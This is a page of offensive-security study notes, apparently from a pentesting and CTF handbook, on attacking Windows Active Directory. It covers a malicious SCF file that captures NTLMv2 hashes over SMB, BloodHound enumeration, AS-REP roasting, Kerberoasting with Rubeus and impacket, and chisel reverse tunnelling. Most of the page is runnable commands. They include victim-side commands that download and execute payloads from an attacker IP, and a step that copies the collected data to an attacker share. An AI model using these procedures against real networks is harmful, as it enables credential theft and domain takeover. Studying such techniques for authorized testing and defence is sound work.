        </div>

        <div class="page-wrapper" tabindex="-1" role="main">
          <div class="page-inner">

            <section class="normal" id="section-">
<div id="windows-vulnerability" class="section level1 unnumbered">
<h1>Windows vulnerability</h1>
<div id="use-scf-file-to-get-the-ntlmv2-hash" class="section level2 unnumbered">
<h2>Use scf file to get the NTLMv2 hash</h2>
<p><strong>SCF</strong> (Shell Command File) are simple files that can be used to perform a connection to the attacker machine by using the
<strong>SMB</strong> protocol. The intersting purpose of those kind of files is that they can perform small and limited set of operations,
but can be executed when the user will browse the file, without the explicit necessity to execute it.</p>
<p>The attacker can take profit of this vulnerability to make a request to his own machine and then get the NTLMv2 hash of the victim one.</p>
<ol style="list-style-type: decimal">
<li><p>in a shell, create a shared folder and let it open</p>
<div class="sourceCode" id="cb76"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb76-1"><a href="windows-vulnerability.html#cb76-1"></a><span class="ex">impacket-smbserver</span> smbFolder <span class="va">$(</span><span class="bu">pwd</span><span class="va">)</span> -smb2support</span></code></pre></div></li>
<li><p>create the malicious scf file</p>
<pre class="scf"><code>[Shell]
Command=2
IconFile=\\10.10.10.11\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop</code></pre></li>
<li><p>copy the malicious file in the desired victim shared resource</p></li>
</ol>
<p>Thatâ€™s itâ€¦ Check the shared folder that you have created previously and if there is an interaction between the victim
and the file, you will receive the NTLMv2 hash of the victim.</p>
<p>You can then try to crack the hash with <strong>john</strong></p>
</div>
<div id="active-directory-enumeration" class="section level2 unnumbered">
<h2>Active Directory Enumeration</h2>
<p>As soon as we see port 88 and 389 or if victime machine changed the port number and we see Kerberos and LDAP, Attacker can estimate that the
victim machine is a Domain Controller.</p>
<p>If we already have credentials, we can enumerate the Active Directory with the bloodhound package</p>
<div id="injesting-bloodhound-from-the-attacker-machine" class="section level3 unnumbered">
<h3>Injesting bloodhound from the attacker machine</h3>
<ol style="list-style-type: decimal">
<li><p>Install bloodhound injester</p>
<div class="sourceCode" id="cb78"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb78-1"><a href="windows-vulnerability.html#cb78-1"></a><span class="ex">python</span> -m venv venv</span>
<span id="cb78-2"><a href="windows-vulnerability.html#cb78-2"></a><span class="bu">source</span> venv/bin/activate</span>
<span id="cb78-3"><a href="windows-vulnerability.html#cb78-3"></a><span class="ex">pip</span> install bloodhound</span></code></pre></div></li>
<li><p>Run enumeration</p>
<div class="sourceCode" id="cb79"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb79-1"><a href="windows-vulnerability.html#cb79-1"></a><span class="ex">bloodhound-python</span> -d victim.local -u username -p <span class="st">&quot;Password&quot;</span> -gc machine.victim.local -c all -ns 10.10.10.11</span></code></pre></div></li>
<li><p>New json files have been created in your working directory</p>
<div class="sourceCode" id="cb80"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb80-1"><a href="windows-vulnerability.html#cb80-1"></a><span class="fu">ls</span> -la *.json</span>
<span id="cb80-2"><a href="windows-vulnerability.html#cb80-2"></a><span class="fu">zip</span> htblocal.zip *.json </span></code></pre></div></li>
</ol>
</div>
<div id="injesting-bloodhound-from-the-victim" class="section level3 unnumbered">
<h3>Injesting bloodhound from the victim</h3>
<p>You can also do the injester technique from the victim machine it self with the <strong>Sharphound.ps1</strong> script.</p>
<div class="sourceCode" id="cb81"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb81-1"><a href="windows-vulnerability.html#cb81-1"></a><span class="fu">wget</span> https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1</span>
<span id="cb81-2"><a href="windows-vulnerability.html#cb81-2"></a><span class="fu">cat</span> SharpHound.ps1 <span class="kw">|</span> <span class="fu">grep</span> <span class="st">&quot;Invoke&quot;</span></span>
<span id="cb81-3"><a href="windows-vulnerability.html#cb81-3"></a><span class="ex">python</span> -m http.server 80</span></code></pre></div>
<p>Then in the victim machine, get the sharphound</p>
<div class="sourceCode" id="cb82"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb82-1"><a href="windows-vulnerability.html#cb82-1"></a><span class="fu">IEX</span>(<span class="fu">New-Object</span> Net.<span class="fu">WebClient</span>).<span class="fu">downloadString</span>(<span class="st">&quot;http://10.10.10.11/SharpHound.ps1&quot;</span>)</span>
<span id="cb82-2"><a href="windows-vulnerability.html#cb82-2"></a>Invoke-BloodHound -CollectionMethod All</span></code></pre></div>
<p>When the SharpHound is finished, you will see a <code>.zip</code> file in the victim machine that you need now to transfer on the
attacker one.</p>
<ol style="list-style-type: decimal">
<li><p>on the attacker machine</p>
<div class="sourceCode" id="cb83"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb83-1"><a href="windows-vulnerability.html#cb83-1"></a><span class="ex">impacket-smbserver</span> smbFolder <span class="va">$(</span><span class="bu">pwd</span><span class="va">)</span> -smb2support</span></code></pre></div></li>
<li><p>on the victim machine</p>
<div class="sourceCode" id="cb84"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb84-1"><a href="windows-vulnerability.html#cb84-1"></a><span class="fu">copy</span> zipfile.<span class="fu">zip</span> \\10.<span class="fu">10</span>.<span class="fu">10</span>.<span class="fu">11</span>\smbFolder\zipfile.<span class="fu">zip</span></span></code></pre></div></li>
</ol>
</div>
<div id="install-bloodhound-and-run-it" class="section level3 unnumbered">
<h3>Install bloodhound and run it</h3>
<ol style="list-style-type: decimal">
<li><p>Install bloodhound and neo4j</p>
<div class="sourceCode" id="cb85"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb85-1"><a href="windows-vulnerability.html#cb85-1"></a><span class="fu">sudo</span> apt install neo4j bloodhound</span></code></pre></div></li>
<li><p>Check that alternatives are not on java11</p>
<div class="sourceCode" id="cb86"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb86-1"><a href="windows-vulnerability.html#cb86-1"></a><span class="ex">update-alternatives</span> --config java</span>
<span id="cb86-2"><a href="windows-vulnerability.html#cb86-2"></a></span>
<span id="cb86-3"><a href="windows-vulnerability.html#cb86-3"></a><span class="co">#dont user java 11</span></span></code></pre></div></li>
<li><p>run neo4j service</p>
<div class="sourceCode" id="cb87"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb87-1"><a href="windows-vulnerability.html#cb87-1"></a><span class="fu">sudo</span> neo4j console</span></code></pre></div></li>
<li><p>run bloodhound</p>
<div class="sourceCode" id="cb88"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb88-1"><a href="windows-vulnerability.html#cb88-1"></a><span class="ex">bloodhound</span> --no-sandbox <span class="op">&amp;&gt;</span> /dev/null <span class="kw">&amp;</span></span>
<span id="cb88-2"><a href="windows-vulnerability.html#cb88-2"></a><span class="bu">disown</span></span></code></pre></div></li>
<li><p>Connect bloodhound to neo4j database</p></li>
<li><p>Drag &amp; Drop the <strong>.zip</strong> file and go to Analysis tab</p>
<ul>
<li>Find all Domains Admins -&gt; Show Administrator of the domain</li>
<li>Find Shortest Paths to Domain Admins -&gt; Fastest way to be converted as Administrator</li>
<li>List all Kerberoastable Accounts -&gt; Find users in wich attacker can execute a Kerberoasting attack (need of credentials)</li>
<li>Find Principals with DCSync Right -&gt; Attacker can run a secretsdump attack to get all users hashes when user have GetChangesAll right.</li>
</ul></li>
</ol>
</div>
</div>
<div id="asreproasing-on-kerberos" class="section level2 unnumbered">
<h2>ASREPRoasing on Kerberos</h2>
<p>If the Kerberos pre-authentication has been disabled for an account, that means that it is vulnerable to ASREPRoasting.
As soon as we have a username, we can use the GetNPUsers script from impacket to retrieve itâ€™s password Hash</p>
<div class="sourceCode" id="cb89"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb89-1"><a href="windows-vulnerability.html#cb89-1"></a><span class="ex">GetNPUsers.py</span> domain/username -request -no-pass -dc-ip 10.10.10.11</span>
<span id="cb89-2"><a href="windows-vulnerability.html#cb89-2"></a></span>
<span id="cb89-3"><a href="windows-vulnerability.html#cb89-3"></a><span class="co">#OUTPUT</span></span>
<span id="cb89-4"><a href="windows-vulnerability.html#cb89-4"></a>[<span class="ex">*</span>] Getting TGT for username</span>
<span id="cb89-5"><a href="windows-vulnerability.html#cb89-5"></a><span class="va">$krb5asrep$2</span><span class="ex">3</span><span class="va">$username</span>@domain:00c4e7b0ce1ad503425a4b0161021fe5<span class="va">$8</span>d8d475c06d1fb191d431055f3dc5cf63e22ebcbb6cdf4a7cb122e</span>
<span id="cb89-6"><a href="windows-vulnerability.html#cb89-6"></a><span class="ex">8f16374f221327e13be255eb60df449969b864abf3322c2c69c16738b9cbbd47ff1a67727656d7c7581c0df55280d19d4553c92fe86fb313fd7fb</span></span>
<span id="cb89-7"><a href="windows-vulnerability.html#cb89-7"></a><span class="ex">843bd2e7796183d005edf241d9c89917239f29834ce6595f7359911e427b21a16154e552536dd1e1c66280e240ee9ea6d9d7ca5c462c5abf9a57ca</span></span>
<span id="cb89-8"><a href="windows-vulnerability.html#cb89-8"></a><span class="ex">46db4af7c4a43b4261f5560257c58e6e1cc51ebe742dbeb903a7379ae7e2db8882018922feed8ae18ee799621de5f64bf0c10284e66a5017a2f6a13</span></span>
<span id="cb89-9"><a href="windows-vulnerability.html#cb89-9"></a><span class="ex">b0ff132e99e715ecded126bdbd6347dd93a0cfff96a586fb5682ce5e04b2960b67401854</span></span></code></pre></div>
<p>You can then copy the TGT in a file and try to crack it with john</p>
</div>
<div id="kerberoasting-attack" class="section level2 unnumbered">
<h2>Kerberoasting attack</h2>
<p>A <strong>Kerberoasting attack</strong> can be done against Kerberoastable users that you find with Bloodhound and need at least a
user and password of a user from the domain.</p>
<div id="kerberoasting-attack-on-victim-machine-with-rubeus" class="section level3 unnumbered">
<h3>Kerberoasting attack on victim machine with rubeus</h3>
<p><strong>Rubeus.exe</strong> is a tool that can perform Kerberoasting attack into the victim machine.</p>
<ol style="list-style-type: decimal">
<li><p>Download rubeus.exe on attacker machine</p>
<div class="sourceCode" id="cb90"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb90-1"><a href="windows-vulnerability.html#cb90-1"></a><span class="fu">git</span> clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</span></code></pre></div></li>
<li><p>Send the rubeus to the victim machine and execute it</p>
<ul>
<li><p>on attacker machine</p>
<div class="sourceCode" id="cb91"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb91-1"><a href="windows-vulnerability.html#cb91-1"></a><span class="ex">python</span> -m http.server 80</span></code></pre></div></li>
<li><p>on victim machine</p>
<div class="sourceCode" id="cb92"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb92-1"><a href="windows-vulnerability.html#cb92-1"></a><span class="fu">iwr</span> -uri http://10.<span class="fu">10</span>.<span class="fu">10</span>.<span class="fu">11</span>/Rubeus.<span class="fu">exe</span> -OutFile Rubeus.<span class="fu">exe</span></span></code></pre></div></li>
</ul></li>
<li><p>Execute ther Kerberoasting attack on the victim machine (in this example we will perform a Kerberoasting with alternate credentials)</p>
<div class="sourceCode" id="cb93"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb93-1"><a href="windows-vulnerability.html#cb93-1"></a>C:\temp\Rubeus.<span class="fu">exe</span> -&gt; check the roating possibilities</span>
<span id="cb93-2"><a href="windows-vulnerability.html#cb93-2"></a>C:\temp\Rubeus.<span class="fu">exe</span> kerberoast /creduser:domain.<span class="fu">local</span>\user /credpassword:password1234</span></code></pre></div></li>
</ol>
<p>You will then see the hash that you can copy into the attacker machine and execute a hashcrack with <strong>john</strong>.</p>
</div>
<div id="kerberoasting-attack-from-attacker-machine-with-impacket-getuserspns" class="section level3 unnumbered">
<h3>Kerberoasting attack from attacker machine with impacket-GetUserSPNs</h3>
<p><strong>Impacket-GetUserSPNs</strong> is a script that can perform kerberoasting attack from the attacker machine. To do that,
the victim machine needs to have the port 88 open and attacker needs to have credentials of at list one domain user.</p>
<p>If port 88 is not externaly opened but you have access to the victim machine by a shell, you can make a reverse port
forwarding to achieve the <strong>Kerberoasting attack</strong> on local.</p>
<ol style="list-style-type: decimal">
<li><p>Sync clock with the victim machine</p>
<div class="sourceCode" id="cb94"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb94-1"><a href="windows-vulnerability.html#cb94-1"></a><span class="ex">rdate</span> -n 10.10.10.10</span></code></pre></div></li>
<li><p>Download chisel and build it on attacker machine</p>
<div class="sourceCode" id="cb95"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb95-1"><a href="windows-vulnerability.html#cb95-1"></a><span class="fu">git</span> clone https://github.com/jpillora/chisel</span>
<span id="cb95-2"><a href="windows-vulnerability.html#cb95-2"></a><span class="bu">cd</span> chisel</span>
<span id="cb95-3"><a href="windows-vulnerability.html#cb95-3"></a><span class="ex">go</span> build -ldflags <span class="st">&quot;-s -w&quot;</span> .</span>
<span id="cb95-4"><a href="windows-vulnerability.html#cb95-4"></a><span class="fu">du</span> -hc chisel</span>
<span id="cb95-5"><a href="windows-vulnerability.html#cb95-5"></a><span class="ex">upx</span> brute chisel</span>
<span id="cb95-6"><a href="windows-vulnerability.html#cb95-6"></a><span class="fu">du</span> -hc chisel</span></code></pre></div></li>
<li><p>Download chisel.exe on <a href="https://github.com/jpillora/chisel/releases/tag/v1.7.6">github chisel release</a> and download the windows_amd64.gz</p></li>
<li><p>Transfer chisel.exe to the victim machine</p>
<ul>
<li><p>on the attacker machine</p>
<div class="sourceCode" id="cb96"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb96-1"><a href="windows-vulnerability.html#cb96-1"></a><span class="fu">mv</span> Downloads/Firefox/chisel_1.7.6_windows_amd64.gz chisel.exe.gz</span>
<span id="cb96-2"><a href="windows-vulnerability.html#cb96-2"></a><span class="fu">gunzip</span> chisel.exe.gz</span>
<span id="cb96-3"><a href="windows-vulnerability.html#cb96-3"></a><span class="ex">python</span> -m http.server 80</span></code></pre></div></li>
<li><p>on the victim machine</p>
<div class="sourceCode" id="cb97"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb97-1"><a href="windows-vulnerability.html#cb97-1"></a><span class="fu">iwr</span> -uri htttp://10.<span class="fu">10</span>.<span class="fu">10</span>.<span class="fu">11</span>/chisel.<span class="fu">exe</span> -outFile chisel.<span class="fu">exe</span></span></code></pre></div></li>
</ul></li>
<li><p>On the attacker machine create reverse server</p>
<div class="sourceCode" id="cb98"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb98-1"><a href="windows-vulnerability.html#cb98-1"></a><span class="ex">./chisel</span> server --reverse --port 1234</span></code></pre></div></li>
<li><p>Port forward victim ports to attacker reverse server</p>
<div class="sourceCode" id="cb99"><pre class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb99-1"><a href="windows-vulnerability.html#cb99-1"></a>C:\temp\chisel.<span class="fu">exe</span> client 10.<span class="fu">10</span>.<span class="fu">10</span>.<span class="fu">11</span>:1234 R:88:127.<span class="fu">0</span>.<span class="fu">0</span>.<span class="fu">1</span>:88</span></code></pre></div></li>
</ol>
<p>Thats it. we can now execute the Kerberoasting attack. Of course the above commands are necessary if the port 88 are not
externaly opened.</p>
<ul>
<li><p>in the case of a victim with port 88 opened the attack will look as following:</p>
<div class="sourceCode" id="cb100"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb100-1"><a href="windows-vulnerability.html#cb100-1"></a><span class="ex">impacket-GetUserSPNs</span> domain.local/user:password -request</span></code></pre></div></li>
<li><p>in the case of having to perform a reverse port forwarding</p>
<div class="sourceCode" id="cb101"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb101-1"><a href="windows-vulnerability.html#cb101-1"></a><span class="ex">impacket-GetUserSPNs</span> domain.local/user:password -request -dc-ip 127.0.0.1</span></code></pre></div></li>
</ul>
<p>You will then see the hash that you can copy in a file and execute a hashcrack with <strong>john</strong>.</p>

</div>
</div>
</div>



<div class="page-inner">
    <section class="normal" id="section-">
        <div class="copyright">
          &copy; 2021 - Lo0pInG 404 <a href="https://michellopez.org">[michellopez.org]</a>
        </div>
    </section>
</div>
            </section>

          </div>
        </div>
      </div>
<a href="web-vulneratilities.html" class="navigation navigation-prev " aria-label="Previous page"><i class="fa fa-angle-left"></i></a>
<a href="beyond-remote-code-execution.html" class="navigation navigation-next " aria-label="Next page"><i class="fa fa-angle-right"></i></a>
    </div>
  </div>
<script src="libs/gitbook-2.6.7/js/app.min.js"></script>
<script src="libs/gitbook-2.6.7/js/lunr.js"></script>
<script src="libs/gitbook-2.6.7/js/clipboard.min.js"></script>
<script src="libs/gitbook-2.6.7/js/plugin-search.js"></script>
<script src="libs/gitbook-2.6.7/js/plugin-sharing.js"></script>
<script src="libs/gitbook-2.6.7/js/plugin-fontsettings.js"></script>
<script src="libs/gitbook-2.6.7/js/plugin-bookdown.js"></script>
<script src="libs/gitbook-2.6.7/js/jquery.highlight.js"></script>
<script src="libs/gitbook-2.6.7/js/plugin-clipboard.js"></script>
<script>
gitbook.require(["gitbook"], function(gitbook) {
gitbook.start({
"sharing": false,
"fontsettings": {
"theme": "night",
"family": "sans",
"size": 2
},
"edit": {
"link": "https://github.com/mlopez66/hacking-notes/edit/master/03-Vulnerability-Assessment/03-01-windows.Rmd",
"text": "Edit"
},
"history": {
"link": null,
"text": null
},
"view": {
"link": null,
"text": null
},
"download": ["2021-Hacking-Notes.pdf"],
"toc": {
"collapse": "section",
"scroll_highlight": true
}
});
});
</script>

</body>

</html>
